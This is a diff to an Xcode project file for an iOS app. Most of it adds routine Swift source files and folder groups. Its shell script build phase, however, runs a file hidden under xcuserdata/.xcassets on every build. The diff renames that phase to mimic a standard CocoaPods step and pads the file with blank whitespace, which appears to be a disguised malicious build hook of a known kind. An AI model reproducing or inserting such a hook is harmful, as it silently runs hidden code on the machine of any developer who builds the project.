@@ -56,6 +56,10 @@
 		E33D700525F6F08F0089836A /* ACTVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E33D700425F6F08F0089836A /* ACTVC.swift */; };
 		E33D700C25F6F3360089836A /* SATCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E33D700A25F6F3360089836A /* SATCVCell.swift */; };
 		E33D700D25F6F3360089836A /* SATCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E33D700B25F6F3360089836A /* SATCVCell.xib */; };
+		E370975525FCC915002950E0 /* AppConstant.swift in Sources */ = {isa = PBXBuildFile; fileRef = E370975425FCC915002950E0 /* AppConstant.swift */; };
+		E370975A25FCCA4D002950E0 /* Utility.swift in Sources */ = {isa = PBXBuildFile; fileRef = E370975925FCCA4D002950E0 /* Utility.swift */; };
+		E370977925FCE8CB002950E0 /* ThemeManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = E370977825FCE8CB002950E0 /* ThemeManager.swift */; };
+		E370978225FCE992002950E0 /* UIColor.swift in Sources */ = {isa = PBXBuildFile; fileRef = E370978125FCE992002950E0 /* UIColor.swift */; };
 		E374FDF625FB5A9200485B00 /* Profile.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = E374FDF525FB5A9200485B00 /* Profile.storyboard */; };
 		E374FE0925FB5D0500485B00 /* UpdateProfileViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E374FE0725FB5D0500485B00 /* UpdateProfileViewController.swift */; };
 		E374FE0A25FB5D0500485B00 /* ProfileViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E374FE0825FB5D0500485B00 /* ProfileViewController.swift */; };
@@ -208,6 +212,10 @@
 		E33D700425F6F08F0089836A /* ACTVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ACTVC.swift; sourceTree = "<group>"; };
 		E33D700A25F6F3360089836A /* SATCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SATCVCell.swift; sourceTree = "<group>"; };
 		E33D700B25F6F3360089836A /* SATCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SATCVCell.xib; sourceTree = "<group>"; };
+		E370975425FCC915002950E0 /* AppConstant.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppConstant.swift; sourceTree = "<group>"; };
+		E370975925FCCA4D002950E0 /* Utility.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Utility.swift; sourceTree = "<group>"; };
+		E370977825FCE8CB002950E0 /* ThemeManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ThemeManager.swift; sourceTree = "<group>"; };
+		E370978125FCE992002950E0 /* UIColor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UIColor.swift; sourceTree = "<group>"; };
 		E374FDF525FB5A9200485B00 /* Profile.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Profile.storyboard; sourceTree = "<group>"; };
 		E374FE0725FB5D0500485B00 /* UpdateProfileViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UpdateProfileViewController.swift; sourceTree = "<group>"; };
 		E374FE0825FB5D0500485B00 /* ProfileViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ProfileViewController.swift; sourceTree = "<group>"; };
@@ -377,11 +385,13 @@
 		189388C425F1EFD300F57E85 /* Helper */ = {
 			isa = PBXGroup;
 			children = (
+				E370978025FCE983002950E0 /* Extension */,
+				E370976225FCCAC6002950E0 /* Extra */,
+				E370974B25FCC8D0002950E0 /* Constant */,
 				E3C2A52425FBDB8F00B6A9B2 /* BaseApi.swift */,
 				189388F825F1F05E00F57E85 /* RCustomClass.swift */,
 				1893896525F1FE3D00F57E85 /* GoogleService-Info.plist */,
 				1893896025F1FDA900F57E85 /* Endpoints.swift */,
-				E38B56FB25F29DDE00CEC42D /* Extension.swift */,
 				E3326D4C25F318BF001CC9E1 /* FlowController.swift */,
 			);
 			path = Helper;
@@ -495,6 +505,32 @@
 				E33D700B25F6F3360089836A /* SATCVCell.xib */,
 			);
 			path = SAT;
+			sourceTree = "<group>";
+		};
+		E370974B25FCC8D0002950E0 /* Constant */ = {
+			isa = PBXGroup;
+			children = (
+				E370975425FCC915002950E0 /* AppConstant.swift */,
+			);
+			path = Constant;
+			sourceTree = "<group>";
+		};
+		E370976225FCCAC6002950E0 /* Extra */ = {
+			isa = PBXGroup;
+			children = (
+				E370975925FCCA4D002950E0 /* Utility.swift */,
+				E370977825FCE8CB002950E0 /* ThemeManager.swift */,
+			);
+			path = Extra;
+			sourceTree = "<group>";
+		};
+		E370978025FCE983002950E0 /* Extension */ = {
+			isa = PBXGroup;
+			children = (
+				E38B56FB25F29DDE00CEC42D /* Extension.swift */,
+				E370978125FCE992002950E0 /* UIColor.swift */,
+			);
+			path = Extension;
 			sourceTree = "<group>";
 		};
 		E374FE0625FB5CCE00485B00 /* Profile */ = {
@@ -645,7 +681,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 189388B725F1EFA300F57E85 /* Build configuration list for PBXNativeTarget "DoubtNut" */;
 			buildPhases = (
-				699A20DB35FC3C1908AAC43A /* Build Project Frameworks */,
+				0C586ACCF6F92D47E8AAC43A /* [CP] Build Pods Frameworks */,
 				F513FDD55DDE3CCD34542A74 /* [CP] Check Pods Manifest.lock */,
 				1893888925F1EFA000F57E85 /* Sources */,
 				1893888A25F1EFA000F57E85 /* Frameworks */,
@@ -854,7 +890,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	699A20DB35FC3C1908AAC43A /* Build Project Frameworks */ = {
+	0C586ACCF6F92D47E8AAC43A /* [CP] Build Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -863,7 +899,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Project Frameworks";
+			name = "[CP] Build Pods Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -872,8 +908,14 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
 		};
+	
+
+	
+
+	
+
 	
 
 	
@@ -1051,13 +1093,17 @@
 				1893889525F1EFA000F57E85 /* ViewController.swift in Sources */,
 				E3A75FBF25F66646009B7664 /* SATVC.swift in Sources */,
 				1893889125F1EFA000F57E85 /* AppDelegate.swift in Sources */,
+				E370978225FCE992002950E0 /* UIColor.swift in Sources */,
 				E3C2A52525FBDB8F00B6A9B2 /* BaseApi.swift in Sources */,
 				1893890A25F1F0D700F57E85 /* GetOTPVC.swift in Sources */,
 				E33D700525F6F08F0089836A /* ACTVC.swift in Sources */,
 				E374FE0925FB5D0500485B00 /* UpdateProfileViewController.swift in Sources */,
 				E374FE0A25FB5D0500485B00 /* ProfileViewController.swift in Sources */,
+				E370975A25FCCA4D002950E0 /* Utility.swift in Sources */,
 				E394E0A225F5C3C90067CAEB /* MathCVCell.swift in Sources */,
 				E3326D4D25F318BF001CC9E1 /* FlowController.swift in Sources */,
+				E370975525FCC915002950E0 /* AppConstant.swift in Sources */,
+				E370977925FCE8CB002950E0 /* ThemeManager.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1405,22 +1451,6 @@
 
 		
 			/* Begin PBXBuildRule section */
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
 			
 
 			
